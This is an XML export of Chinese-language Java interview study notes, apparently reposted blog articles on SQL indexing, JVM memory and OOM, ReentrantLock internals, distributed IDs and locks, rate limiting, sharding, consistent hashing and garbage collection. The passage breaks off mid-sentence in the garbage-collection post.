    <content type="text"><![CDATA[SQL 优化负向查询不能使用索引1select name from user where id not in (1,3,4); 应该修改为: 1select name from user where id in (2,5,6); 前导模糊查询不能使用索引如: 1select name from user where name like '%zhangsan' 非前导则可以:1select name from user where name like 'zhangsan%' 建议可以考虑使用 Lucene 等全文索引工具来代替频繁的模糊查询。 数据区分不明显的不建议创建索引如 user 表中的性别字段，可以明显区分的才建议创建索引，如身份证等字段。 字段的默认值不要为 null这样会带来和预期不一致的查询结果。 在字段上进行计算不能命中索引1select name from user where FROM_UNIXTIME(create_time) &lt; CURDATE(); 应该修改为: 1select name from user where create_time &lt; FROM_UNIXTIME(CURDATE()); 最左前缀问题如果给 user 表中的 username pwd 字段创建了复合索引那么使用以下SQL 都是可以命中索引: 12345select username from user where username='zhangsan' and pwd ='axsedf1sd'select username from user where pwd ='axsedf1sd' and username='zhangsan'select username from user where username='zhangsan' 但是使用 1select username from user where pwd ='axsedf1sd' 是不能命中索引的。 如果明确知道只有一条记录返回1select name from user where username='zhangsan' limit 1 可以提高效率，可以让数据库停止游标移动。 不要让数据库帮我们做强制类型转换1select name from user where telno=18722222222 这样虽然可以查出数据，但是会导致全表扫描。 需要修改为1select name from user where telno=&apos;18722222222&apos; 如果需要进行 join 的字段两表的字段类型要相同不然也不会命中索引。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL-Index]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FMySQL-Index%2F</url>
    <content type="text"><![CDATA[MySQL 索引原理现在互联网应用中对数据库的使用多数都是读较多，比例可以达到 10:1。并且数据库在做查询时 IO 消耗较大，所以如果能把一次查询的 IO 次数控制在常量级那对数据库的性能提升将是非常明显的，因此基于 B+ Tree 的索引结构出现了。 B+ Tree 的数据结构 如图所示是 B+ Tree 的数据结构。是由一个一个的磁盘块组成的树形结构，每个磁盘块由数据项和指针组成。 所有的数据都是存放在叶子节点，非叶子节点不存放数据。 查找过程以磁盘块1为例，指针 P1 表示小于17的磁盘块，P2 表示在 17~35 之间的磁盘块，P3 则表示大于35的磁盘块。 比如要查找数据项99，首先将磁盘块1 load 到内存中，发生 1 次 IO。接着通过二分查找发现 99 大于 35，所以找到了 P3 指针。通过P3 指针发生第二次 IO 将磁盘块4加载到内存。再通过二分查找发现大于87，通过 P3 指针发生了第三次 IO 将磁盘块11 加载到内存。最后再通过一次二分查找找到了数据项99。 由此可见，如果一个几百万的数据查询只需要进行三次 IO 即可找到数据，那么整个效率将是非常高的。 观察树的结构，发现查询需要经历几次 IO 是由树的高度来决定的，而树的高度又由磁盘块，数据项的大小决定的。 磁盘块越大，数据项越小那么数的高度就越低。这也就是为什么索引字段要尽可能小的原因。 索引使用的一些原则。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MemoryAllocation]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FMemoryAllocation%2F</url>
    <content type="text"><![CDATA[Java 运行时的内存划分 程序计数器记录当前线程所执行的字节码行号，用于获取下一条执行的字节码。 当多线程运行时，每个线程切换后需要知道上一次所运行的状态、位置。由此也可以看出程序计数器是每个线程私有的。 虚拟机栈虚拟机栈是有一个一个的栈帧组成，栈帧是在每一个方法调用时产生的。 每一个栈帧由局部变量区、操作数栈等组成。每创建一个栈帧压栈，当一个方法执行完毕之后则出栈。 如果出现方法递归调用出现死循环的话就会造成栈帧过多，最终会抛出 stackoverflow 异常。 这块内存区域也是线程私有的。 Java 堆Java 堆是整个虚拟机所管理的最大内存区域，所有的对象创建都是在这个区域进行内存分配。 这块区域也是垃圾回收器重点管理的区域，由于大多数垃圾回收器都采用分代回收算法，所有堆内存也分为 新生代、老年代，可以方便垃圾的准确回收。 这块内存属于线程共享区域。 方法区方法区主要用于存放已经被虚拟机加载的类信息，如常量，静态变量。这块区域也被称为永久代。 运行时常量池运行时常量池是方法区的一部分，其中存放了一些符号引用。当 new 一个对象时，会检查这个区域是否有这个符号的引用。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ReentrantLock]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FReentrantLock%2F</url>
    <content type="text"><![CDATA[ReentrantLock 实现原理使用 synchronize 来做同步处理时，锁的获取和释放都是隐式的，实现的原理是通过编译后加上不同的机器指令来实现。 而 ReentrantLock 就是一个普通的类，它是基于 AQS(AbstractQueuedSynchronizer)来实现的。 是一个重入锁：一个线程获得了锁之后仍然可以反复的加锁，不会出现自己阻塞自己的情况。 AQS 是 Java 并发包里实现锁、同步的一个重要的基础框架。 锁类型ReentrantLock 分为公平锁和非公平锁，可以通过构造方法来指定具体类型： 123456789//默认非公平锁public ReentrantLock() &#123; sync = new NonfairSync();&#125;//公平锁public ReentrantLock(boolean fair) &#123; sync = fair ? new FairSync() : new NonfairSync();&#125; 默认一般使用非公平锁，它的效率和吞吐量都比公平锁高的多(后面会分析具体原因)。 获取锁通常的使用方式如下: 1234567891011private ReentrantLock lock = new ReentrantLock();public void run() &#123; lock.lock(); try &#123; //do bussiness &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125;&#125; 公平锁获取锁首先看下获取锁的过程： 123public void lock() &#123; sync.lock();&#125; 可以看到是使用 sync的方法，而这个方法是一个抽象方法，具体是由其子类(FairSync)来实现的，以下是公平锁的实现: 12345678910 final void lock() &#123; acquire(1); &#125; //AbstractQueuedSynchronizer 中的 acquire() public final void acquire(int arg) &#123; if (!tryAcquire(arg) &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt();&#125; 第一步是尝试获取锁(tryAcquire(arg)),这个也是由其子类实现： 1234567891011121314151617181920 protected final boolean tryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) &#123; if (!hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, acquires)) &#123; setExclusiveOwnerThread(current); return true; &#125; &#125; else if (current == getExclusiveOwnerThread()) &#123; int nextc = c + acquires; if (nextc &lt; 0) throw new Error("Maximum lock count exceeded"); setState(nextc); return true; &#125; return false; &#125;&#125; 首先会判断 AQS 中的 state 是否等于 0，0 表示目前没有其他线程获得锁，当前线程就可以尝试获取锁。 注意:尝试之前会利用 hasQueuedPredecessors() 方法来判断 AQS 的队列中中是否有其他线程，如果有则不会尝试获取锁(这是公平锁特有的情况)。 如果队列中没有线程就利用 CAS 来将 AQS 中的 state 修改为1，也就是获取锁，获取成功则将当前线程置为获得锁的独占线程(setExclusiveOwnerThread(current))。 如果 state 大于 0 时，说明锁已经被获取了，则需要判断获取锁的线程是否为当前线程(ReentrantLock 支持重入)，是则需要将 state + 1，并将值更新。 写入队列如果 tryAcquire(arg) 获取锁失败，则需要用 addWaiter(Node.EXCLUSIVE) 将当前线程写入队列中。 写入之前需要将当前线程包装为一个 Node 对象(addWaiter(Node.EXCLUSIVE))。 AQS 中的队列是由 Node 节点组成的双向链表实现的。 包装代码: 1234567891011121314private Node addWaiter(Node mode) &#123; Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure Node pred = tail; if (pred != null) &#123; node.prev = pred; if (compareAndSetTail(pred, node)) &#123; pred.next = node; return node; &#125; &#125; enq(node); return node;&#125; 首先判断队列是否为空，不为空时则将封装好的 Node 利用 CAS 写入队尾，如果出现并发写入失败就需要调用 enq(node); 来写入了。 123456789101112131415private Node enq(final Node node) &#123; for (;;) &#123; Node t = tail; if (t == null) &#123; // Must initialize if (compareAndSetHead(new Node())) tail = head; &#125; else &#123; node.prev = t; if (compareAndSetTail(t, node)) &#123; t.next = node; return t; &#125; &#125; &#125;&#125; 这个处理逻辑就相当于自旋加上 CAS 保证一定能写入队列。 挂起等待线程写入队列之后需要将当前线程挂起(利用acquireQueued(addWaiter(Node.EXCLUSIVE), arg))： 123456789101112131415161718192021final boolean acquireQueued(final Node node, int arg) &#123; boolean failed = true; try &#123; boolean interrupted = false; for (;;) &#123; final Node p = node.predecessor(); if (p == head &amp;&amp; tryAcquire(arg)) &#123; setHead(node); p.next = null; // help GC failed = false; return interrupted; &#125; if (shouldParkAfterFailedAcquire(p, node) &amp;&amp; parkAndCheckInterrupt()) interrupted = true; &#125; &#125; finally &#123; if (failed) cancelAcquire(node); &#125;&#125; 首先会根据 node.predecessor() 获取到上一个节点是否为头节点，如果是则尝试获取一次锁，获取成功就万事大吉了。 如果不是头节点，或者获取锁失败，则会根据上一个节点的 waitStatus 状态来处理(shouldParkAfterFailedAcquire(p, node))。 waitStatus 用于记录当前节点的状态，如节点取消、节点等待等。 shouldParkAfterFailedAcquire(p, node) 返回当前线程是否需要挂起，如果需要则调用 parkAndCheckInterrupt()： 1234private final boolean parkAndCheckInterrupt() &#123; LockSupport.park(this); return Thread.interrupted();&#125; 他是利用 LockSupport 的 part 方法来挂起当前线程的，直到被唤醒。 非公平锁获取锁公平锁与非公平锁的差异主要在获取锁： 公平锁就相当于买票，后来的人需要排到队尾依次买票，不能插队。 而非公平锁则没有这些规则，是抢占模式，每来一个人不会去管队列如何，直接尝试获取锁。 非公平锁:1234567final void lock() &#123; //直接尝试获取锁 if (compareAndSetState(0, 1)) setExclusiveOwnerThread(Thread.currentThread()); else acquire(1);&#125; 公平锁:123final void lock() &#123; acquire(1);&#125; 还要一个重要的区别是在尝试获取锁时tryAcquire(arg)，非公平锁是不需要判断队列中是否还有其他线程，也是直接尝试获取锁： 12345678910111213141516171819final boolean nonfairTryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) &#123; //没有 !hasQueuedPredecessors() 判断 if (compareAndSetState(0, acquires)) &#123; setExclusiveOwnerThread(current); return true; &#125; &#125; else if (current == getExclusiveOwnerThread()) &#123; int nextc = c + acquires; if (nextc &lt; 0) // overflow throw new Error("Maximum lock count exceeded"); setState(nextc); return true; &#125; return false;&#125; 释放锁公平锁和非公平锁的释放流程都是一样的： 12345678910111213141516171819202122232425262728public void unlock() &#123; sync.release(1);&#125;public final boolean release(int arg) &#123; if (tryRelease(arg)) &#123; Node h = head; if (h != null &amp;&amp; h.waitStatus != 0) //唤醒被挂起的线程 unparkSuccessor(h); return true; &#125; return false;&#125;//尝试释放锁protected final boolean tryRelease(int releases) &#123; int c = getState() - releases; if (Thread.currentThread() != getExclusiveOwnerThread()) throw new IllegalMonitorStateException(); boolean free = false; if (c == 0) &#123; free = true; setExclusiveOwnerThread(null); &#125; setState(c); return free;&#125; 首先会判断当前线程是否为获得锁的线程，由于是重入锁所以需要将 state 减到 0 才认为完全释放锁。 释放之后需要调用 unparkSuccessor(h) 来唤醒被挂起的线程。 总结由于公平锁需要关心队列的情况，得按照队列里的先后顺序来获取锁(会造成大量的线程上下文切换)，而非公平锁则没有这个限制。 所以也就能解释非公平锁的效率会被公平锁更高。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OOM-analysis]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FOOM-analysis%2F</url>
    <content type="text"><![CDATA[OOM 分析Java 堆内存溢出在 Java 堆中只要不断的创建对象，并且 GC-Roots 到对象之间存在引用链，这样 JVM 就不会回收对象。 只要将-Xms(最小堆),-Xmx(最大堆) 设置为一样禁止自动扩展堆内存。 当使用一个 while(true) 循环来不断创建对象就会发生 OutOfMemory，还可以使用 -XX:+HeapDumpOutofMemoryErorr 当发生 OOM 时会自动 dump 堆栈到文件中。 伪代码: 123456public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(10) ; while (true)&#123; list.add("1") ; &#125;&#125; 当出现 OOM 时可以通过工具来分析 GC-Roots 引用链 ，查看对象和 GC-Roots 是如何进行关联的，是否存在对象的生命周期过长，或者是这些对象确实改存在的，那就要考虑将堆内存调大了。 123456789101112131415Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:3210) at java.util.Arrays.copyOf(Arrays.java:3181) at java.util.ArrayList.grow(ArrayList.java:261) at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:235) at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:227) at java.util.ArrayList.add(ArrayList.java:458) at com.crossoverjie.oom.HeapOOM.main(HeapOOM.java:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:147)Process finished with exit code 1 java.lang.OutOfMemoryError: Java heap space表示堆内存溢出。 MetaSpace (元数据) 内存溢出 JDK8 中将永久代移除，使用 MetaSpace 来保存类加载之后的类信息，字符串常量池也被移动到 Java 堆。 PermSize 和 MaxPermSize 已经不能使用了，在 JDK8 中配置这两个参数将会发出警告。 JDK 8 中将类信息移到到了本地堆内存(Native Heap)中，将原有的永久代移动到了本地堆中成为 MetaSpace ,如果不指定该区域的大小，JVM 将会动态的调整。 可以使用 -XX:MaxMetaspaceSize=10M 来限制最大元数据。这样当不停的创建类时将会占满该区域并出现 OOM。 123456789101112131415public static void main(String[] args) &#123; while (true)&#123; Enhancer enhancer = new Enhancer() ; enhancer.setSuperclass(HeapOOM.class); enhancer.setUseCache(false) ; enhancer.setCallback(new MethodInterceptor() &#123; @Override public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123; return methodProxy.invoke(o,objects) ; &#125; &#125;); enhancer.create() ; &#125;&#125; 使用 cglib 不停的创建新类，最终会抛出:1234567891011Caused by: java.lang.reflect.InvocationTargetException at sun.reflect.GeneratedMethodAccessor1.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at net.sf.cglib.core.ReflectUtils.defineClass(ReflectUtils.java:459) at net.sf.cglib.core.AbstractClassGenerator.generate(AbstractClassGenerator.java:336) ... 11 moreCaused by: java.lang.OutOfMemoryError: Metaspace at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:763) ... 16 more 注意：这里的 OOM 伴随的是 java.lang.OutOfMemoryError: Metaspace 也就是元数据溢出。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ID-generator]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FID-generator%2F</url>
    <content type="text"><![CDATA[分布式 ID 生成器一个唯一 ID 在一个分布式系统中是非常重要的一个业务属性，其中包括一些如订单 ID，消息 ID ，会话 ID，他们都有一些共有的特性： 全局唯一。 趋势递增。 全局唯一很好理解，目的就是唯一标识某个次请求，某个业务。 通常有以下几种方案： 基于数据库可以利用 MySQL 中的自增属性 auto_increment 来生成全局唯一 ID，也能保证趋势递增。但这种方式太依赖 DB，如果数据库挂了那就非常容易出问题。 水平扩展改进但也有改进空间，可以将数据库水平拆分，如果拆为了两个库 A 库和 B 库。A 库的递增方式可以是 0 ,2 ,4 ,6。B 库则是 1 ,3 ,5 ,7。这样的方式可以提高系统可用性，并且 ID 也是趋势递增的。 但也有如下一下问题： 想要扩容增加性能变的困难，之前已经定义好了 A B 库递增的步数，新加的数据库不好加入进来，水平扩展困难。 也是强依赖与数据库，并且如果其中一台挂掉了那就不是绝对递增了。 本地 UUID 生成还可以采用 UUID 的方式生成唯一 ID，由于是在本地生成没有了网络之类的消耗，所有效率非常高。 但也有以下几个问题： 生成的 ID 是无序性的，不能做到趋势递增。 由于是字符串并且不是递增，所以不太适合用作主键。 采用本地时间这种做法非常简单，可以利用本地的毫秒数加上一些业务 ID 来生成唯一ID，这样可以做到趋势递增，并且是在本地生成效率也很高。 但有一个致命的缺点:当并发量足够高的时候唯一性就不能保证了。 Twitter 雪花算法可以基于 Twitter 的 Snowflake 算法来实现。它主要是一种划分命名空间的算法，将生成的 ID 按照机器、时间等来进行标志。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinkedList]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FLinkedList%2F</url>
    <content type="text"><![CDATA[LinkedList 底层分析 如图所示 LinkedList 底层是基于双向链表实现的，也是实现了 List 接口，所以也拥有 List 的一些特点(JDK1.7/8 之后取消了循环，修改为双向链表)。 新增方法123456789101112131415161718public boolean add(E e) &#123; linkLast(e); return true;&#125; /** * Links e as last element. */void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; 可见每次插入都是移动指针，和 ArrayList 的拷贝数组来说效率要高上不少。 查询方法1234567891011121314151617181920public E get(int index) &#123; checkElementIndex(index); return node(index).item;&#125;Node&lt;E&gt; node(int index) &#123; // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125;&#125; 由此可以看出是使用二分查找来看 index 离 size 中间距离来判断是从头结点正序查还是从尾节点倒序查。 node()会以O(n/2)的性能去获取一个结点 如果索引值大于链表大小的一半，那么将从尾结点开始遍历 这样的效率是非常低的，特别是当 index 越接近 size 的中间值时。 总结： LinkedList 插入，删除都是移动指针效率很高。 查找需要进行遍历查询，效率较低。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java-lock]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FJava-lock%2F</url>
    <content type="text"><![CDATA[对锁的一些认知 有哪些锁同一进程重入锁使用 ReentrantLock 获取锁的时候会会判断当前线程是否为获取锁的线程，如果是则将同步的状态 +1 ,释放锁的时候则将状态 -1。只有将同步状态的次数置为 0 的时候才会最终释放锁。 读写锁使用 ReentrantReadWriteLock ,同时维护一对锁：读锁和写锁。当写线程访问时则其他所有锁都将阻塞，读线程访问时则不会。通过读写锁的分离可以很大程度的提高并发量和吞吐量。 不同进程分布式锁： 基于数据库可以创建一张表，将其中的某个字段设置为唯一索引，当多个请求过来的时候只有新建记录成功的请求才算获取到锁，当使用完毕删除这条记录的时候即释放锁。 存在的问题: 数据库单点问题，挂了怎么办？ 不是重入锁，同一进程无法在释放锁之前再次获得锁，因为数据库中已经存在了一条记录了。 锁是非阻塞的，一旦 insert 失败则会立即返回，并不会进入阻塞队列只能下一次再次获取。 锁没有失效时间，如果那个进程解锁失败那就没有请求可以再次获取锁了。 解决方案: 数据库切换为主从，不存在单点。 在表中加入一个同步状态字段，每次获取锁的是加 1 ，释放锁的时候-1，当状态为 0 的时候就删除这条记录，即释放锁。 非阻塞的情况可以用 while 循环来实现，循环的时候记录时间，达到 X 秒记为超时，break。 可以开启一个定时任务每隔一段时间扫描找出多少 X 秒都没有被删除的记录，主动删除这条记录。 基于 Redis使用 setNX(key) setEX(timeout) 命令，只有在该 key 不存在的时候创建和这个 key，就相当于获取了锁。由于有超时时间，所以过了规定时间会自动删除，这样也可以避免死锁。 可以参考： 基于 Redis 的分布式锁 基于 ZK]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Limiting]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FLimiting%2F</url>
    <content type="text"><![CDATA[限流算法限流是解决高并发大流量的一种方案，至少是可以保证应用的可用性。 通常有以下两种限流方案： 漏桶算法 令牌桶算法 漏桶算法 漏桶算法非常简单，就是将流量放入桶中并按照一定的速率流出。如果流量过大时候并不会提高流出效率，而溢出的流量也只能是抛弃掉了。 这种算法很简单，但也非常粗暴，无法应对突发的大流量。这时可以考虑令牌桶算法。 令牌桶算法 令牌桶算法是按照恒定的速率向桶中放入令牌，每当请求经过时则消耗一个或多个令牌。当桶中的令牌为 0 时，请求则会被阻塞。 note：令牌桶算法支持先消费后付款，比如一个请求可以获取多个甚至全部的令牌，但是需要后面的请求付费。也就是说后面的请求需要等到桶中的令牌补齐之后才能继续获取。 实例:12345678910111213141516171819202122232425@Overridepublic BaseResponse&lt;UserResVO&gt; getUserByFeignBatch(@RequestBody UserReqVO userReqVO) &#123; //调用远程服务 OrderNoReqVO vo = new OrderNoReqVO() ; vo.setReqNo(userReqVO.getReqNo()); RateLimiter limiter = RateLimiter.create(2.0) ; //批量调用 for (int i = 0 ;i&lt; 10 ; i++)&#123; double acquire = limiter.acquire(); logger.debug("获取令牌成功!,消耗=" + acquire); BaseResponse&lt;OrderNoResVO&gt; orderNo = orderServiceClient.getOrderNo(vo); logger.debug("远程返回:"+JSON.toJSONString(orderNo)); &#125; UserRes userRes = new UserRes() ; userRes.setUserId(123); userRes.setUserName("张三"); userRes.setReqNo(userReqVO.getReqNo()); userRes.setCode(StatusEnum.SUCCESS.getCode()); userRes.setMessage("成功"); return userRes ;&#125; 单 JVM 限流 分布式限流]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ClassLoad]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FClassLoad%2F</url>
    <content type="text"><![CDATA[类加载机制双亲委派模型模型如下图： 双亲委派模型中除了启动类加载器之外其余都需要有自己的父类加载器 当一个类收到了类加载请求时: 自己不会首先加载，而是委派给父加载器进行加载，每个层次的加载器都是这样。 所以最终每个加载请求都会经过启动类加载器。只有当父类加载返回不能加载时子加载器才会进行加载。 双亲委派的好处 : 由于每个类加载都会经过最顶层的启动类加载器，比如 java.lang.Object这样的类在各个类加载器下都是同一个类(只有当两个类是由同一个类加载器加载的才有意义，这两个类才相等。) 如果没有双亲委派模型，由各个类加载器自行加载的话。当用户自己编写了一个 java.lang.Object类，那样系统中就会出现多个 Object，这样 Java 程序中最基本的行为都无法保证，程序会变的非常混乱。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DB-split]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FDB-split%2F</url>
    <content type="text"><![CDATA[数据库水平垂直拆分当数据库量非常大的时候，DB 已经成为系统瓶颈时就可以考虑进行水平垂直拆分了。 水平拆分一般水平拆分是根据表中的某一字段(通常是主键 ID )取模处理，将一张表的数据拆分到多个表中。这样每张表的表结构是相同的但是数据不同。 不但可以通过 ID 取模分表还可以通过时间分表，比如每月生成一张表。按照范围分表也是可行的:一张表只存储 0~1000W的数据，超过只就进行分表，这样分表的优点是扩展灵活，但是存在热点数据。 按照取模分表拆分之后我们的查询、修改、删除也都是取模。比如新增一条数据的时候往往需要一张临时表来生成 ID,然后根据生成的 ID 取模计算出需要写入的是哪张表(也可以使用分布式 ID 生成器来生成 ID)。 分表之后不能避免的就是查询要比以前复杂，通常不建议 join ，一般的做法是做两次查询。 垂直拆分当一张表的字段过多时则可以考虑垂直拆分。通常是将一张表的字段才分为主表以及扩展表，使用频次较高的字段在一张表，其余的在一张表。 这里的多表查询也不建议使用 join ，依然建议使用两次查询。 拆分之后带来的问题拆分之后由一张表变为了多张表，一个库变为了多个库。最突出的一个问题就是事务如何保证。 两段提交最终一致性如果业务对强一致性要求不是那么高那么最终一致性则是一种比较好的方案。 通常的做法就是补偿，比如 一个业务是 A 调用 B，两个执行成功才算最终成功，当 A 成功之后，B 执行失败如何来通知 A 呢。 比较常见的做法是 失败时 B 通过 MQ 将消息告诉 A，A 再来进行回滚。这种的前提是 A 的回滚操作得是幂等的，不然 B 重复发消息就会出现问题。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Consistent-Hash]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FConsistent-Hash%2F</url>
    <content type="text"><![CDATA[一致 Hash 算法当我们在做数据库分库分表或者是分布式缓存时，不可避免的都会遇到一个问题: 如何将数据均匀的分散到各个节点中，并且尽量的在加减节点时能使受影响的数据最少。 Hash 取模随机放置就不说了，会带来很多问题。通常最容易想到的方案就是 hash 取模了。 可以将传入的 Key 按照 index = hash(key) % N 这样来计算出需要存放的节点。其中 hash 函数是一个将字符串转换为正整数的哈希映射方法，N 就是节点的数量。 这样可以满足数据的均匀分配，但是这个算法的容错性和扩展性都较差。 比如增加或删除了一个节点时，所有的 Key 都需要重新计算，显然这样成本较高，为此需要一个算法满足分布均匀同时也要有良好的容错性和拓展性。 一致 Hash 算法一致 Hash 算法是将所有的哈希值构成了一个环，其范围在 0 ~ 2^32-1。如下图： 之后将各个节点散列到这个环上，可以用节点的 IP、hostname 这样的唯一性字段作为 Key 进行 hash(key)，散列之后如下： 之后需要将数据定位到对应的节点上，使用同样的 hash 函数 将 Key 也映射到这个环上。 这样按照顺时针方向就可以把 k1 定位到 N1节点，k2 定位到 N3节点，k3 定位到 N2节点。 容错性这时假设 N1 宕机了： 依然根据顺时针方向，k2 和 k3 保持不变，只有 k1 被重新映射到了 N3。这样就很好的保证了容错性，当一个节点宕机时只会影响到少少部分的数据。 拓展性当新增一个节点时: 在 N2 和 N3 之间新增了一个节点 N4 ，这时会发现受印象的数据只有 k3，其余数据也是保持不变，所以这样也很好的保证了拓展性。 虚拟节点到目前为止该算法依然也有点问题: 当节点较少时会出现数据分布不均匀的情况： 这样会导致大部分数据都在 N1 节点，只有少量的数据在 N2 节点。 为了解决这个问题，一致哈希算法引入了虚拟节点。将每一个节点都进行多次 hash，生成多个节点放置在环上称为虚拟节点: 计算时可以在 IP 后加上编号来生成哈希值。 这样只需要在原有的基础上多一步由虚拟节点映射到实际节点的步骤即可让少量节点也能满足均匀性。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GarbageCollection]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FGarbageCollection%2F</url>
    <content type="text"><![CDATA[垃圾回收 垃圾回收主要思考三件事情: 哪种内存需要回收？ 什么时候回收？ 怎么回收？ 对象是否存活引用计数法这是一种非常简单易理解的回收算法。每当有一个地方引用一个对象的时候则在引用计数器上 +1，当失效的时候就 -1，无论什么时候计数器为 0 的时候则认为该对象死亡可以回收了。 这种算法虽然简单高效，但是却无法解决循环引用的问题，因此 Java 虚拟机并没有采用这种算法。 可达性分析算法主流的语言其实都是采用可达性分析算法: 可达性算法是通过一个称为 GC Roots 的对象向下搜索，整个搜索路径就称为引用链，当一个对象到 GC Roots 没有任何引用链 JVM 就认为该对象是可以被回收的。 如图:Object1、2、3、4 都是存活的对象，而 Object5、6、7都是可回收对象。 可以用作 GC-Roots 的对象有: 方法区中静态变量所引用的对象。 虚拟机栈中所引用的对象。 垃圾回收算法标记-清除算法标记清除算法分为两个步骤，标记和清除。首先将需要回收的对象标记起来，然后统一清除。但是存在两个主要的问题: 标记和清除的效率都不高。 清除之后容易出现不连续内存，当需要分配一个较大内存时就不得不需要进行一次垃圾回收。 标记清除过程如下: 复制算法复制算法是将内存划分为两块大小相等的区域，每次使用时都只用其中一块区域，当发生垃圾回收时会将存活的对象全部复制到未使用的区域，然后对之前的区域进行全部回收。 这样简单高效，而且还不存在标记清除算法中的内存碎片问题，但就是有点浪费内存。 在新生代会使用该算法。 新生代中分为一个 Eden 区和两个 Survivor 区。通常两个区域的比例是 8:1:1 ，使用时会用到 Eden 区和其中一个 Survivor 区。当发生回收时则会将还存活的对象从 Eden ，Survivor 区拷贝到另一个 Survivor 区，当该区域内存也不足时则会使用分配担保利用老年代来存放内存。 复制算法过程： 标记整理算法复制算法如果在存活对象较多时效率明显会降低，特别是在老年代中并没有多余的内存区域可以提供内存担保。 所以老年代中使用的时候分配整理算法，它的原理和分配清除算法类似，只是最后一步的清除改为了将存活对象全部移动到一端，然后再将边界之外的内存全部回收。 分代回收算法现代多数的商用 